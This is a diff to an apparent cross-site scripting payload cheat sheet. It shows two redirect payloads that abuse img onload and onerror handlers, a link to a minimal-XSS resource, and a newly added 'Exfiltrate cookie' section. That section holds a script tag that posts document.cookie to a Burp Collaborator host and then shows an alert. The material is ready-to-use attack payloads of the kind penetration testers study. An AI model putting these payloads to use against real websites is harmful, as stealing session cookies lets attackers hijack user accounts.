@@ -4,6 +4,9 @@
 1. http://Test"><img src=x onload=window.location="http://google.com">
 2. "><img src=x onerror=window.location="http://google.com">
 
+## Exfiltrate cookie:
+<script>fetch('https://anmol.burpcollaborator.net?'+document.cookie, {method: 'POST',mode: 'no-cors',body:document.cookie});alert('exfiltrated the document.cookie');</script>
+
 ## Tiny XSS
 1. <a href="https://tinyxss.terjanq.me/">Tiny XSS by @terjanq</a>
 
